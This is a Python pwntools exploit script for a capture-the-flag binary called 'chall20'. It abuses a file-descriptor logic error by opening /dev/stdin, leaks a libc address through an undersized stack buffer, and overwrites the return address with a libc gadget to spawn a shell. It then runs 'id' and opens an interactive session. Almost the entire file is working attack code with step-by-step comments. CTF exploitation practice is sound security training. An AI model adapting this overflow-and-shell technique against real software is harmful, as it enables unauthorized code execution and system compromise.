#!/usr/bin/env python2.7
from pwn import *
 
 
HOST = 'localhost'
PORT = 30000
#HOST = 'challenge.pwny.racing'
#PORT = 40020

#io = process('../bin/chall20', level='debug')
io = remote(HOST, PORT, level='debug')
print io.recvuntil('\n\nfile')[:-6]
 
# step 1: open a blocked file, logic error will mean the fp is not closed
io.recvuntil(': ')
io.sendline('/dev/stdin')
#io.sendline('/proc/self/fd/0')
 
# step 2: try open a file that does not exist, this will ensure the last
#         fp will still be set and we can read
io.recvuntil(': ')
io.sendline('abc')
 
# step 3: now that stdin is open for reading, we can write to the stack
#         and the buffer is set to -1 bytes which means alloca makes a 
#         tiny buffer and we can read as much as we want. the deliminators
#         of the buffer are \n and \r, but \n gets replaced with a \0 so
#         by terminating the buffer with \r we can ensure we get leaks.
#io.send(cyclic(24)+'\r')
io.send(cyclic(16)+'\r')
io.recvuntil('data: ')
leak  = io.recvline().strip()
print repr(leak)
 
#stack = u32(leak[-5:-1])
leak  = u32(leak[17:21])
libc  = leak - 0xe67e5
stack = 0
 
log.info('stack: 0x%08x' % stack)
log.info('leak:  0x%08x' % leak)
log.info('libc:  0x%08x' % libc)
 
# step 4: repeat step 1 and step 2 in order to perform the overflow of the
#         return address on the stack now that libc is leaked.
io.recvuntil(': ')
io.sendline('/dev/stdin')
io.recvuntil(': ')
io.sendline('abc')
 
# step 5: time to shine.
io.sendline(cyclic(82)+p32(libc+0x3d0e0))
 
#step 6: collec the shell
io.recvline()
io.sendline('id')
log.success('shell? %s' % io.recvline().strip())
 
io.interactive()